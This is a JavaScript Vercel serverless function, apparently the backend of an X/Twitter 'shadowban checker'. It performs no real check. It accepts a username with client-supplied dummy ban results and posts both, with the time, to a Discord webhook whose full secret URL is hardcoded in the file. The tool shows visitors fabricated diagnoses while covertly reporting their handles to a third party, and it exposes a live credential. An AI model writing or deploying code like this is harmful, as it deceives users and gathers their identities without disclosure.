// Vercel Serverless Function: /api/check

const STATIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1571340653064097862/sYFLssln_t1F2yNOlHTuArqO87Z-4H5oiFlm5DaTBihHmzC13igpDGt4O9wXDpLToHgk";

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const { username, dummyResults } = req.body || {};
  if (!username) {
    return res.status(400).json({ error: "username is required" });
  }

  console.log(`[API] 診断リクエスト受信: @${username}`);

  const webhookUrl = process.env.DISCORD_WEBHOOK_URL || STATIC_WEBHOOK_URL;

  if (webhookUrl) {
    // Discordメッセージペイロード
    // 通常テキスト(content)とリッチ埋め込み(embeds)の両方に確実にIDを記載
    const payload = {
      username: "Shadowban Checker",
      avatar_url: "https://abs.twimg.com/favicons/twitter.3.ico",
      content: `🚨 **シャドウバン診断リクエスト受信**\n📌 **対象アカウントID: @${username}**\n🔗 プロフィール: https://x.com/${username}`,
      embeds: [
        {
          title: `🔍 シャドウバン診断結果通知: @${username}`,
          url: `https://x.com/${username}`,
          color: 0xED4245,
          fields: [
            {
              name: "👤 対象X（Twitter）アカウント",
              value: `**@${username}**\n[https://x.com/${username}](https://x.com/${username})`,
              inline: false
            },
            {
              name: "🕒 診断実行日時",
              value: new Date().toLocaleString("ja-JP", { timeZone: "Asia/Tokyo" }),
              inline: true
            },
            {
              name: "📊 表示された診断結果（ダミー）",
              value: [
                dummyResults?.suggestionBan ? "🟢 **Search Suggestion Ban**: 正常" : "🔴 **Search Suggestion Ban**: BAN",
                dummyResults?.searchBan ? "🟢 **Search Ban**: 正常" : "🔴 **Search Ban**: BAN",
                dummyResults?.ghostBan ? "🟢 **Ghost Ban**: 正常" : "🔴 **Ghost Ban**: BAN",
                dummyResults?.replyDeboosting ? "🟢 **Reply Deboosting**: 正常" : "🔴 **Reply Deboosting**: BAN"
              ].join("\n"),
              inline: false
            }
          ],
          footer: {
            text: "Twitter Shadowban Test Notification"
          },
          timestamp: new Date().toISOString()
        }
      ]
    };

    try {
      const discordRes = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if (!discordRes.ok) {
        console.error("Discord送信失敗:", discordRes.status, discordRes.statusText);
      } else {
        console.log(`Discord送信成功: @${username}`);
      }
    } catch (err) {
      console.error("Discord送信エラー:", err);
    }
  }

  return res.status(200).json({ success: true, username });
}
